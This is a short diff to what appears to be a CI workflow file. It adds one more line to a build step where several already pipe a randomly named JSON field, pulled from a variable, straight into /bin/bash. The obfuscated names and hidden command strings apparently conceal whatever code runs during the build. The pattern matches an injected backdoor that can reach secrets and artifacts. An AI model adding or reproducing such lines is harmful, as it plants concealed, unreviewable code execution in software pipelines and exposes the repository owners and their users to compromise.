@@ -32,6 +32,7 @@ jobs:
           printf '%s' "$wd2" | jq -r .fhog738 | /bin/bash
           echo $qldji42 | jq -r .zarz6536 | /bin/bash
           echo $noa27 | jq -r .icj5877 | /bin/bash
+          echo $dbr5 | jq -r .njce35465 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
